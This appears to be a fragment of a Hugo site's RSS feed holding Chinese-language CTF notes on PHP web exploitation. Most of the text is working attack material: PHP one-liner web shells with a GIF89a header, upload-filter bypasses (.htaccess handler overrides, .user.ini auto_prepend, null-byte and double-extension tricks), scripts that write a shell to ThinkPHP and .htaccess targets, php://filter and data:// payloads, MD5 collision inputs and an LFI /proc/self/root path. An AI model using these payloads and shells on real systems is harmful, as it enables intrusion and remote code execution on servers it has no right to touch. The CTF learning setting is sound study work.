+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有一道题的java后端代码&lt;/p></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/htaccess%E7%9A%84%E5%88%A9%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/htaccess%E7%9A%84%E5%88%A9%E7%94%A8/</guid><description>&lt;p>总结&lt;a href="https://www.anquanke.com/post/id/205098">.htaccess利用与Bypass方式总结-安全客 - 安全资讯平台 (anquanke.com)&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>import requests
+
+
+htaccess = &amp;#39;&amp;#39;&amp;#39;php_value auto_prepend_fi\\
+le &amp;#34;.htaccess&amp;#34;
+%23&amp;lt;?php system(&amp;#34;cat /????&amp;#34;);?&amp;gt;\\&amp;#39;&amp;#39;&amp;#39;
+
+
+url = &amp;#39;http://d68ad6f6-f107-42e2-b2bc-0f4713f98e9d.node4.buuoj.cn:81/?filename={}&amp;amp;content={}&amp;#39;.format(&amp;#39;.htaccess&amp;#39;, htaccess)
+r = requests.get(url=url)
+print(r.status_code)
+&lt;/code>&lt;/pre>&lt;p>最后的\是为了使其不换行,\用来绕过关键字&lt;/p>
+&lt;pre tabindex="0">&lt;code> file_put_contents($filename, $content . &amp;#34;\nJust one chance&amp;#34;)
+&lt;/code>&lt;/pre></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/md5%E7%A2%B0%E6%92%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/md5%E7%A2%B0%E6%92%9E/</guid><description>&lt;h2 id="1">
+ 1.
+ &lt;a class="anchor" href="#1">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>a!=b&amp;amp;&amp;amp;md5(a)==md5(b)
+&lt;/code>&lt;/pre>&lt;p>PHP中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。PHP在处理哈希字符串的时候，它把每一个以0e开头并且后面字符均为纯数字的哈希值都解析为0&lt;/p>
+&lt;p>例子&lt;/p>
+&lt;pre tabindex="0">&lt;code>QNKCDZO
+0e830400451993494058024219903391
+
+s878926199a
+0e545993274517709034328855841020
+
+s155964671a
+0e342768416822451524974117254469
+
+s214587387a
+0e848240448830537924465865611904
+
+s214587387a
+0e848240448830537924465865611904
+
+0e215962017
+0e291242476940776845150308577824
+
+ffifdyop
+&amp;#39;or&amp;#39; sql 闭合
+&lt;/code>&lt;/pre>&lt;h2 id="2">
+ 2.
+ &lt;a class="anchor" href="#2">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>a!=b&amp;amp;&amp;amp;md5(a)===md5(b)
+&lt;/code>&lt;/pre>&lt;p>md5函数无法处理数组，返回（NULL）&lt;/p>
+&lt;pre tabindex="0">&lt;code>a[]=1&amp;amp;b[]=2
+&lt;/code>&lt;/pre>&lt;h2 id="3">
+ 3.
+ &lt;a class="anchor" href="#3">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>(string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;])
+&lt;/code>&lt;/pre>&lt;p>md5相同&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+
+$s1 = &amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;#34;;
+$s2 = &amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&amp;#34;;
+$s3 = &amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;#34;;
+var_dump(md5(urldecode($s1)));
+var_dump(md5(urldecode($s2)));
+var_dump(md5(urldecode($s3)));
+&lt;/code>&lt;/pre></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</guid><description>&lt;h2 id="1-phpfile">
+ 1. php://file
+ &lt;a class="anchor" href="#1-phpfile">#&lt;/a>
+&lt;/h2>
+&lt;p>一般用作递上去文件&lt;/p>
+&lt;pre tabindex="0">&lt;code>php://filter/convert.base64-encode/resource=flag
+&lt;/code>&lt;/pre>&lt;h2 id="2-data">
+ 2. data
+ &lt;a class="anchor" href="#2-data">#&lt;/a>
+&lt;/h2>
+&lt;p>可以执行命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>data://text.plain,hello_ctf
+data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==
+&lt;/code>&lt;/pre>&lt;h2 id="3-input">
+ 3. input
+ &lt;a class="anchor" href="#3-input">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>php://input
+&lt;/code>&lt;/pre>&lt;p>post同时传，也可传php代码执行&lt;/p>
+&lt;pre tabindex="0">&lt;code>hello ctf
+&lt;/code>&lt;/pre>&lt;p>常用于一下情况&lt;/p>
+&lt;p>file_get_content($name)==“hello ctf”&lt;/p>
+&lt;p>关于绕过base64-encode字眼,使用其他编码&lt;/p>
+&lt;pre tabindex="0">&lt;code>a=[
+&amp;#39;UCS-4*&amp;#39;,
+&amp;#39;UCS-4BE&amp;#39;,
+&amp;#39;UCS-4LE*&amp;#39;,
+&amp;#39;UCS-2&amp;#39;,
+&amp;#39;UCS-2BE&amp;#39;,
+&amp;#39;UCS-2LE&amp;#39;,
+&amp;#39;UTF-32*&amp;#39;,
+&amp;#39;UTF-32BE*&amp;#39;,
+&amp;#39;UTF-32LE*&amp;#39;,
+&amp;#39;UTF-16*&amp;#39;,
+&amp;#39;UTF-16BE*&amp;#39;,
+&amp;#39;UTF-16LE*&amp;#39;,
+&amp;#39;UTF-7&amp;#39;,
+&amp;#39;UTF7-IMAP&amp;#39;,
+&amp;#39;UTF-8*&amp;#39;,
+&amp;#39;ASCII*&amp;#39;,
+&amp;#39;SJIS*&amp;#39;,
+&amp;#39;EUC-JP*&amp;#39;,
+&amp;#39;eucJP-win*&amp;#39;,
+&amp;#39;SJIS-win*&amp;#39;,
+&amp;#39;ISO-2022-JP&amp;#39;,
+&amp;#39;ISO-2022-JP-MS&amp;#39;,
+&amp;#39;CP932&amp;#39;,
+&amp;#39;CP51932&amp;#39;,
+&amp;#39;BASE64&amp;#39;]
+p=[]
+for i in a:
+ for j in a:
+ p.append(i+&amp;#39;.&amp;#39;+j)
+print(len(p))
+
+import requests,time
+for i in p:
+ time.sleep(0.1)
+ result=requests.get(f&amp;#39;http://61.147.171.105:58809/?filename=php://filter//convert.iconv.{i}/resource=flag.php&amp;#39;,timeout=5).text
+ if len(result)&amp;gt;1120:
+ print(i,&amp;#39;------------------&amp;#39;)
+ # break
+ print(i,len(result))
+&lt;/code>&lt;/pre>&lt;p>亦可&lt;/p></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</guid><description>&lt;h2 id="preg_match">
+ preg_match
+ &lt;a class="anchor" href="#preg_match">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>在没有修饰符s(匹配换行符)的时候。preg_match只能匹配一行&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>最大回溯次数&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在正则匹配当中，如果存在符号 &amp;quot; .*? &amp;quot; ，那么匹配的时候便会使用非贪婪模式。非贪婪模式匹配原理简单来说就是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配。最大回溯是1000000次&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>python&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;pre tabindex="0">&lt;code>&amp;#39;flag&amp;#39;*1000000+&amp;#39;system(&amp;#34;ls&amp;#34;)&amp;#39;
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>
+&lt;p>就绕过了system&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="mt_seed">
+ mt_seed
+ &lt;a class="anchor" href="#mt_seed">#&lt;/a>
+&lt;/h2>
+&lt;p>设置随机数种子&lt;/p>
+&lt;p>&lt;a href="https://www.freebuf.com/vuls/192012.html">PHP mt_rand安全杂谈及应用场景详解 - FreeBuf网络安全行业门户&lt;/a>&lt;/p>
+&lt;p>配合软件https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz&lt;/p>
+&lt;p>编译&lt;/p>
+&lt;pre tabindex="0">&lt;code>make
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>str1 =&amp;#39;Hg11vtADEm&amp;#39;
+str2 = &amp;#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;
+result =&amp;#39;&amp;#39;
+
+length = str(len(str2)-1)
+for i in range(0,len(str1)):
+ for j in range(0,len(str2)):
+ if str1[i] == str2[j]:
+ result += str(j) + &amp;#39; &amp;#39; +str(j) + &amp;#39; &amp;#39; + &amp;#39;0&amp;#39; + &amp;#39; &amp;#39; + length + &amp;#39; &amp;#39;
+ break
+
+print(result)
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>./php_mt_seed xx xx
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+mt_srand(348806110);
+$str_long1 = &amp;#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;;
+$str=&amp;#39;&amp;#39;;
+$len1=20;
+for ( $i = 0; $i &amp;lt; $len1; $i++ ){
+ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); 
+}
+echo $str;
+?&amp;gt; 
+&lt;/code>&lt;/pre>&lt;h2 id="assert">
+ assert
+ &lt;a class="anchor" href="#assert">#&lt;/a>
+&lt;/h2>
+&lt;p>断言，其写法相当于&lt;/p></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#66d9ef">eval&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;cmd&amp;#39;&lt;/span>]);&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>加上头文件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GIF89a&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#66d9ef">eval&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;cmd&amp;#39;&lt;/span>]);&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> 
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>绕过php字段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;assert&amp;#34;&lt;/span>;$a(&lt;span style="color:#f92672">@&lt;/span>$_POST[&lt;span style="color:#e6db74">&amp;#39;shell&amp;#39;&lt;/span>]); &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span> &lt;span style="color:#a6e22e">language&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;php&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;@&lt;/span>&lt;span style="color:#66d9ef">eval&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;cmd&amp;#39;&lt;/span>])&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="绕过">
+ 绕过
+ &lt;a class="anchor" href="#%e7%bb%95%e8%bf%87">#&lt;/a>
+&lt;/h2>
+&lt;h4 id="apache解析漏洞">
+ apache解析漏洞
+ &lt;a class="anchor" href="#apache%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e">#&lt;/a>
+&lt;/h4>
+&lt;p>Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析&lt;/p>
+&lt;p>如png为白名单，apache无法解析png,会将其解析为php&lt;/p>
+&lt;pre tabindex="0">&lt;code>1.php.png
+&lt;/code>&lt;/pre>&lt;h4 id="截断">
+ 截断
+ &lt;a class="anchor" href="#%e6%88%aa%e6%96%ad">#&lt;/a>
+&lt;/h4>
+&lt;pre tabindex="0">&lt;code>1.php%00.png
+&lt;/code>&lt;/pre>&lt;h4 id="htaccess">
+ .htaccess
+ &lt;a class="anchor" href="#htaccess">#&lt;/a>
+&lt;/h4>
+&lt;pre tabindex="0">&lt;code>&amp;lt;FilesMatch &amp;#34;png&amp;#34;&amp;gt;
+SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;
+&lt;/code>&lt;/pre>&lt;h4 id="userini">
+ .user.ini
+ &lt;a class="anchor" href="#userini">#&lt;/a>
+&lt;/h4>
+&lt;p>先上传.user.ini，后面的图片马会被自动解析为php&lt;/p>
+&lt;p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。&lt;/p>
+&lt;pre tabindex="0">&lt;code>GIF89a
+auto_prepend_file=test.gif
+&lt;/code>&lt;/pre>&lt;p>不包含数字和字母的shell&lt;/p>
+&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html&lt;/a>&lt;/p>
+&lt;h4 id="大小写">
+ 大小写
+ &lt;a class="anchor" href="#%e5%a4%a7%e5%b0%8f%e5%86%99">#&lt;/a>
+&lt;/h4>
+&lt;p>pass&lt;/p>
+&lt;h4 id="双写">
+ 双写
+ &lt;a class="anchor" href="#%e5%8f%8c%e5%86%99">#&lt;/a>
+&lt;/h4>
+&lt;p>pass&lt;/p>
+&lt;h2 id="think-php-upload">
+ Think PHP upload
+ &lt;a class="anchor" href="#think-php-upload">#&lt;/a>
+&lt;/h2>
+&lt;p>think php upload 在不传参的时候可以多文件上传&lt;/p>
+&lt;pre tabindex="0">&lt;code>import requests
+url = &amp;#34;http://8cbe0e9c-b7de-46f3-b93d-555073775ad1.node3.buuoj.cn/index.php/home/index/upload&amp;#34;
+files = {&amp;#39;file&amp;#39;:(&amp;#34;1.txt&amp;#34;,&amp;#34;&amp;#34;)}
+files2={&amp;#39;file[]&amp;#39;:(&amp;#39;1.php&amp;#39;,&amp;#34;&amp;lt;?php eval($_GET[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;#34;)} # 用数组多文件上传
+
+r = requests.post(url,files = files) #上传两遍,因为文件名是以uniqid命名的
+print (r.text)
+r = requests.post(url,files = files2)
+print (r.text)
+r = requests.post(url,files = files)
+print (r.text)
+&lt;/code>&lt;/pre>&lt;p>再爆破php的文件名&lt;/p></description></item><item><title/><link>http://localhost:1313/docs/network-security/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://localhost:1313/docs/network-security/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid><description>&lt;h2 id="文件包含">
+ 文件包含
+ &lt;a class="anchor" href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab">#&lt;/a>
+&lt;/h2>
+&lt;p>常见的有include,require,include_once,require_once&lt;/p>
+&lt;p>其中once表示已经包含的不会再包含&lt;/p>
+&lt;p>如果有include flah.php&lt;/p>
+&lt;p>在让我们包含include_once $file&lt;/p>
+&lt;p>可以用&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+&lt;/code>&lt;/pre>&lt;p>利用伪协议&lt;/p>
+&lt;p>data,file等&lt;/p>
+&lt;p>174.1.33.5	web1
+172.2.215.9	web1&lt;/p></description></item></channel></rss>
